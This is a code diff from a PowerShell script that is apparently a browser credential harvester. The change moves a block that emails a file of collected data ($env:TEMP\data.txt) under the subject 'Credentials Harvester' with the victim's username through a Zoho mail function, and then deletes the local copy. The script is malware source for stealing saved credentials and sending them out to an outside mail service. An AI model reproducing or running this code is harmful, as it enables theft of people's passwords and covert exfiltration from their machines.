@@ -127,12 +127,13 @@ function RunWBPV {
         ###############################################################################
 
         # SEND to EMAIL or WEBHOOK
-        if (-not $isEmailSent) {
-             # Email parameters
-             $subject = "$env:USERNAME: Credentials Harvester - Sent on $currentDateTime"
-             $attachments = @("$env:TEMP\data.txt")  # Array of attachment file paths
-             Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
-        }    
+        # if (-not $isEmailSent) {
+        #      # Email parameters
+        #      $subject = "$env:USERNAME: Credentials Harvester - Sent on $currentDateTime"
+        #      $attachments = @("$env:TEMP\data.txt")  # Array of attachment file paths
+        #      Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+        # }   
+        
 
         if (-not $isEmailSent) { 
                 $filePath = "$env:TEMP\data.txt" # Define the path to the text file using the TEMP environment variable
@@ -498,6 +499,14 @@ function ClearCache {
         $attachments = @("$env:TEMP\example-logs.txt")  # Array of attachment file paths
         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
     } 
+
+	# email data.txt
+	if (-not $isEmailSent) {
+        # Email parameters
+        $subject = "$env:USERNAME: Credentials Harvester - Sent on $currentDateTime"
+        $attachments = @("$env:TEMP\data.txt")  # Array of attachment file paths
+        Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+    }
 
     # RunWBPV
     Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
